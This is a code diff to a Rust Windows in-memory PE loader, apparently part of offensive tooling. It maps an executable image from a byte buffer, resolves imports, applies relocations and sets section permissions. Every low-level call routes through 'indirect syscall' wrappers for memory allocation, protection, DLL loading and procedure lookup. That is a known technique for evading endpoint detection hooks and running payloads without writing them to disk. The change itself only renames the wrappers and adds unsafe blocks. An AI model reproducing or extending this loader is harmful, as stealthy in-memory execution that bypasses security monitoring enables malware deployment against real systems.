@@ -118,7 +118,7 @@ unsafe fn get_data_directory(nt_headers: *const ImageNtHeaders64, index: usize) 
 
 #[cfg(windows)]
 unsafe fn set_section_permissions(image_base: *mut u8, section: &ImageSectionHeader) -> Result<(), String> {
-    use crate::syscalls::indirect_syscall_ntprotectvirtualmemory;
+    use crate::syscalls::indirect_ntprotectvirtualmemory;
     use std::ffi::c_void;
     use winapi::um::processthreadsapi::GetCurrentProcess;
     let characteristics = section.characteristics;
@@ -137,13 +137,15 @@ unsafe fn set_section_permissions(image_base: *mut u8, section: &ImageSectionHea
     let section_start = image_base.add(section.virtual_address as usize);
     let mut old_protect = 0;
     let mut region_size = section.virtual_size as usize;
-    let status = indirect_syscall_ntprotectvirtualmemory(
-        GetCurrentProcess() as *mut _,
-        &mut (section_start as *mut c_void),
-        &mut region_size,
-        protect,
-        &mut old_protect,
-    );
+    let status = unsafe {
+        indirect_ntprotectvirtualmemory(
+            GetCurrentProcess() as *mut _,
+            &mut (section_start as *mut c_void),
+            &mut region_size,
+            protect,
+            &mut old_protect,
+        )
+    };
     if status != 0 {
         return Err(format!("Failed to set section protection (error: {})", GetLastError()));
     }
@@ -186,8 +188,8 @@ unsafe fn process_relocations(image_base: *mut u8, nt_headers: *const ImageNtHea
 
 #[cfg(windows)]
 unsafe fn resolve_imports(image_base: *mut u8, nt_headers: *const ImageNtHeaders64) -> Result<(), String> {
-    use crate::syscalls::{indirect_syscall_ldrloaddll, indirect_syscall_ldrgetprocedureaddress};
-use winapi::shared::ntdef::{UNICODE_STRING, ANSI_STRING};
+    use crate::syscalls::{indirect_ldrloaddll, indirect_ldrgetprocedureaddress};
+    use winapi::shared::ntdef::{UNICODE_STRING, ANSI_STRING};
     let import_dir = get_data_directory(nt_headers, IMAGE_DIRECTORY_ENTRY_IMPORT);
     if (*import_dir).virtual_address == 0 {
         return Ok(());
@@ -204,11 +206,13 @@ use winapi::shared::ntdef::{UNICODE_STRING, ANSI_STRING};
             MaximumLength: (dll_name_unicode.len() * 2) as u16,
             Buffer: dll_name_unicode.as_mut_ptr(),
         };
-        let status = indirect_syscall_ldrloaddll(
-            &mut us,
-            ptr::null_mut(),
-            &mut module,
-        );
+        let status = unsafe {
+            indirect_ldrloaddll(
+                &mut us,
+                ptr::null_mut(),
+                &mut module,
+            )
+        };
         if status != 0 {
             return Err(format!("Failed to load DLL: {:?} (error: {})", dll_name, GetLastError()));
         }
@@ -222,7 +226,14 @@ use winapi::shared::ntdef::{UNICODE_STRING, ANSI_STRING};
             let mut func_addr = ptr::null_mut();
             if (*thunk_ref & (1 << 63)) != 0 {
                 let ordinal = (*thunk_ref & 0xFFFF) as u16;
-                indirect_syscall_ldrgetprocedureaddress(module, ptr::null(), ordinal, &mut func_addr);
+                unsafe {
+                    indirect_ldrgetprocedureaddress(
+                        module,
+                        ptr::null(),
+                        ordinal,
+                        &mut func_addr,
+                    );
+                }
             } else {
                 let import_by_name = image_base.add(*thunk_ref as usize) as *const ImageImportByName;
                 let func_name_ptr = &(*import_by_name).name as *const u8 as *const i8;
@@ -232,7 +243,14 @@ use winapi::shared::ntdef::{UNICODE_STRING, ANSI_STRING};
                     MaximumLength: func_name_cstr.to_bytes().len() as u16,
                     Buffer: func_name_ptr as *mut i8,
                 };
-                indirect_syscall_ldrgetprocedureaddress(module, &mut ansi_string, 0, &mut func_addr);
+                unsafe {
+                    indirect_ldrgetprocedureaddress(
+                        module,
+                        &mut ansi_string,
+                        0,
+                        &mut func_addr,
+                    );
+                }
             };
             if func_addr.is_null() {
                 return Err(format!("Failed to import function (error: {})", GetLastError()));
@@ -268,7 +286,7 @@ unsafe fn process_tls_callbacks(image_base: *mut u8, nt_headers: *const ImageNtH
 
 #[cfg(windows)]
 unsafe fn finalize_sections(image_base: *mut u8, nt_headers: *const ImageNtHeaders64) -> Result<(), String> {
-    use crate::syscalls::indirect_syscall_ntflushinstructioncache;
+    use crate::syscalls::indirect_ntflushinstructioncache;
     use winapi::um::processthreadsapi::GetCurrentProcess;
     let section_header_ptr = (nt_headers as *const ImageNtHeaders64 as usize
         + mem::size_of::<u32>()
@@ -278,17 +296,19 @@ unsafe fn finalize_sections(image_base: *mut u8, nt_headers: *const ImageNtHeade
     for i in 0..(*nt_headers).file_header.number_of_sections {
         set_section_permissions(image_base, &*section_header_ptr.offset(i as isize))?;
     }
-    indirect_syscall_ntflushinstructioncache(
-        GetCurrentProcess() as *mut _,
-        image_base as *mut _,
-        (*nt_headers).optional_header.size_of_image as usize,
-    );
+    unsafe {
+        indirect_ntflushinstructioncache(
+            GetCurrentProcess() as *mut _,
+            image_base as *mut _,
+            (*nt_headers).optional_header.size_of_image as usize,
+        );
+    }
     Ok(())
 }
 
 #[cfg(windows)]
 unsafe fn load_pe_from_memory(pe_data: &[u8]) -> Result<(), String> {
-    use crate::syscalls::indirect_syscall_ntallocatevirtualmemory;
+    use crate::syscalls::indirect_ntallocatevirtualmemory;
     use std::ffi::c_void;
     use winapi::um::processthreadsapi::GetCurrentProcess;
     if pe_data.len() < mem::size_of::<ImageDosHeader>() {
@@ -322,14 +342,16 @@ unsafe fn load_pe_from_memory(pe_data: &[u8]) -> Result<(), String> {
     let mut image_base: *mut c_void = ptr::null_mut();
     let mut region_size = image_size;
 
-    let status = indirect_syscall_ntallocatevirtualmemory(
-        GetCurrentProcess() as *mut _,
-        &mut image_base,
-        0,
-        &mut region_size,
-        MEM_COMMIT | MEM_RESERVE,
-        PAGE_READWRITE,
-    );
+    let status = unsafe {
+        indirect_ntallocatevirtualmemory(
+            GetCurrentProcess() as *mut _,
+            &mut image_base,
+            0,
+            &mut region_size,
+            MEM_COMMIT | MEM_RESERVE,
+            PAGE_READWRITE,
+        )
+    };
 
     if status != 0 {
         return Err(format!("Memory allocation failed with status: {}", status));
